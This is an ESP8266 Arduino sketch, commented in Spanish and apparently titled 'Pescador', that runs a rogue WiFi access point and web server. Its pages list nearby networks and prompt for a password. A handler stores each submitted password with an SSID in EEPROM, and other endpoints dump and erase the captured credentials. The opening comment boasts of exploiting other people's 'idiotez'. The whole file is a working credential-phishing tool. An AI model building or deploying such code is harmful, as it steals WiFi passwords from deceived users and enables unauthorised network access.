/*
El pescador hace de la pacienciencia un arma.
También aprovecha la idiotez ajena.
*/

// Includes
#include <ESP8266WiFi.h>                        // https://github.com/esp8266/Arduino
#include <WiFiClient.h>
#include <ESP8266WebServer.h>
#include <EEPROM.h>

// Cabeceras
#include "pescador.h"                           // Cabeceras de Funciones y esas cosas

ESP8266WebServer server(80);                    // Inicia Servidos en el puerto 80

void setup() {
  Serial.begin(115200);
  Serial.println(F(""));
  Serial.println(F(""));
  Serial.println(F("Iniciando..."));
  Serial.println(F(""));

  EEPROM.begin(2048);

  // Configura el modudulo como AP
  WiFi.mode(WIFI_AP);
  WiFi.persistent(true);
  WiFi.disconnect();
  WiFi.softAPConfig(local_IP, gateway, subnet);
  WiFi.softAP("Pescador", "00msdmi00");
  Serial.println(F("Wifi Iniciado."));

  // Configura el servidor y las paginas disponibles
  server.on("/", handleRoot);
  server.on("/apescar", handleAPescar);
  server.on("/pique", handlePique);
  server.on("/i", handleInfo);
  server.on("/eeprom", handleEeprom);
  server.on("/eepromdelete", handleEepromDelete);

  // Inicia el Servidor
  server.begin();
  Serial.println(F("Servidor Iniciado."));

}

void loop() {
  int i = 0;
  Serial.print(i);
  i++;
  server.handleClient();          //Handle client requests
}


/*
PAGINAS
*/

// Root
void handleRoot()
{
  String pagina = FPSTR(HTML_Head);
  pagina += FPSTR(HTML_Style_Root);
  pagina += FPSTR(HTML_Head_end);
  pagina += FPSTR(HTML_Formulario_Root);
  //pagina += FPSTR(HTML_Input_Root);
  //pagina += FPSTR(HTML_Formulario_Root_end);
  pagina += FPSTR(HTML_end);
  server.send(200, "text/html", pagina); //Send web page
  Serial.println(F("root"));
}

// A Pescar
void handleAPescar()
{
 String pagina = FPSTR(HTML_Head);
 pagina += FPSTR(HTML_Style);
 pagina += FPSTR(HTML_Head_end);
 pagina += String(F("<h1>&#127907;</h1>"));
 pagina += FPSTR(HTML_Formulario);
 pagina += listaWiFiHTML();
 pagina += FPSTR(HTML_Formulario_end);
 pagina += FPSTR(HTML_end);
 pagina += FPSTR(BOTON_Pescar);
 server.send(200, "text/html", pagina); //Send web page
 Serial.println(F("a pescar"));
}

// Pique - Dale cañazo
void handlePique()
{
  String pass = String(F("{SSID:"));
  pass += WiFi.SSID();
  pass += String(F(";PASS:"));
  pass += server.arg("p");
  pass += String(F("}"));
  for (int i = 0; i < pass.length(); i++)
  {
    EEPROM.write(i + 1024, pass[i]);
  }
  EEPROM.commit();

 server.send(200, "text/html", pass); //Send web page
 Serial.println(F("pique"));
}

// Informacion
void handleInfo()
{
  String pagina = FPSTR(HTML_Head);
  pagina += FPSTR(HTML_Style);
  pagina += FPSTR(HTML_Head_end);
  pagina += F("<dl>");
  pagina += F("<dt>Chip ID</dt><dd>");
  pagina += ESP.getChipId();
  pagina += F("</dd>");
  pagina += F("<dt>Flash Chip ID</dt><dd>");
  pagina += ESP.getFlashChipId();
  pagina += F("</dd>");
  pagina += F("<dt>IDE Flash Size</dt><dd>");
  pagina += ESP.getFlashChipSize();
  pagina += F(" bytes</dd>");
  pagina += F("<dt>Real Flash Size</dt><dd>");
  pagina += ESP.getFlashChipRealSize();
  pagina += F(" bytes</dd>");
  pagina += F("<dt>Soft AP IP</dt><dd>");
  pagina += WiFi.softAPIP().toString();
  pagina += F("</dd>");
  pagina += F("<dt>Soft AP MAC</dt><dd>");
  pagina += WiFi.softAPmacAddress();
  pagina += F("</dd>");
  pagina += F("<dt>Station MAC</dt><dd>");
  pagina += WiFi.macAddress();
  pagina += F("</dd>");
  pagina += F("</dl>");
  pagina += FPSTR(HTML_end);
  server.send(200, "text/html", pagina);
}

// Eeprom
void handleEeprom()
{
  String ee;
  for(int i = 0; i < 1024; i++)
  {
    ee = ee + char(EEPROM.read(i + 1024)); //Read one by one with starting address of 0x0F
  }
   server.send(200, "text/html", ee); //Send web page
   Serial.println(F("eeprom"));
}

// Eeprom
void handleEepromDelete()
{
  for (int i = 0; i < 1024; i++)
  {
    EEPROM.write(i + 1024, 0);
  }
  EEPROM.commit();
}

/*
  FUNCIONES para las paginas HTML
*/
// Arma una lista de wifis
String listaWiFiHTML()
{
  String s = String(F(""));
  int n = WiFi.scanNetworks();

  //sort networks
  int indices[n];
  for (int i = 0; i < n; i++)
  {
    indices[i] = i;
  }

  // RSSI SORT
  for (int i = 0; i < n; i++)
  {
    for (int j = i + 1; j < n; j++)
    {
      if (WiFi.RSSI(indices[j]) > WiFi.RSSI(indices[i]))
      {
        std::swap(indices[i], indices[j]);
      }
    }
  }

  for (int i = 0; i < n; ++i)
    {
      s += String(F("<input type=\"radio\" name=\"w\" value=\""));
      s += WiFi.SSID(indices[i]);
      s += String(F("\"> "));
      s += WiFi.encryptionType(indices[i]) != ENC_TYPE_NONE ? "&#128032; - " : "";
      s += WiFi.SSID(indices[i]);
      s += String(F(" - "));
      s += calidadSenial(WiFi.RSSI(indices[i]));
      s += String(F(" % <br> "));
     }
   return s;
}

// Devuelve la calidad de la señal detectada en %
int calidadSenial(int RSSI)
{
  int calidad = 0;

  if (RSSI <= -100)
  {
    calidad = 0;
  }
  else if (RSSI >= -50)
  {
    calidad = 100;
  }
  else
  {
    calidad = 2 * (RSSI + 100);
  }
  return calidad;
}
